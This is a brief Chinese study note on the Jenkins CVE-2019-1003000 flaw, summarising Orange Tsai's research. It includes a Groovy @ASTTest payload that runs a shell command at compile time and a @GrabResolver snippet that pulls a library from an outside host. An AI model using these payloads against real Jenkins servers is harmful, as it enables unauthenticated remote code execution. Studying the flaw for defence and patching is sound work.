# CVE-2019-1003000

具体的直接看orange的好啦，讲得很棒



## Pipeline

> 大部分開發者會選擇 Jenkins 作為 CI/CD 伺服器的其中一個原因是因為 Jenkins 提供了一個很強大的 Pipeline 功能，使開發者可以方便的去撰寫一些 Build Script 以完成自動化的編譯、測試及發佈! 你可以想像 Pipeline 就是一個小小的微語言可以去對 Jenkins 進行操作(而實際上 Pipeline 是基於 Groovy 的一個 DSL)



## Meta-Programming

元编程，也称作超编程，是指某类计算机程序的编写。这类计算机程序编写或者操纵其它程序（或者自身）作为它们的数据，或者在运行时完成部分本应在编译时完成的工作。多数情况下，与手工编写全部代码相比，程序员可以获得更高的工作效率，或者给与程序更大的灵活度去处理新的情形而无需重新编译。







Pipeline是基于Groovy的一个DSL，而Groovy刚好是对于Meta-Programming非常友善的语言。



**@groovy.transform.ASTTest**

> `@ASTTest` is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and **perform assertions on the AST** rather than on the result of compilation. This means that this AST transformations gives access to the AST before the bytecode is produced. `@ASTTest` can be placed on any annotable node and requires two parameters:



本地验证：

```
this.class.classLoader.parseClass('''
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec("touch pwned")
})
def x
''');
```

结果：

```
$ ls
poc.groovy

$ groovy poc.groovy
$ ls
poc.groovy  pwned
```



在jenkins上复现：

```
unable to resolve class org.jenkinsci.plugins.workflow.libs.Library
```





**@Grab**

Grape(`@Grab`) 是一個 Groovy 內建的動態 JAR 相依性管理程式! 可讓開發者動態的引入不在 classPath 上的函式庫!

语法如下：

```
@Grab(group='org.springframework', module='spring-orm', version='3.2.5.RELEASE')
import org.springframework.jdbc.core.JdbcTemplate
```



**@GrabResolver**

```
@GrabResolver(name='restlet', root='http://maven.restlet.org/')
@Grab(group='org.restlet', module='org.restlet', version='1.1.6')
import org.restlet
```



```
this.class.classLoader.parseClass('''
@GrabResolver(name='restlet', root='http://orange.tw/')
@Grab(group='org.restlet', module='org.restlet', version='1.1.6')
import org.restlet
''')
```



透過 Grape 可以讓 Jenkins 引入惡意的函式庫







## Reference

http://groovy-lang.org/metaprogramming.html

https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html

https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/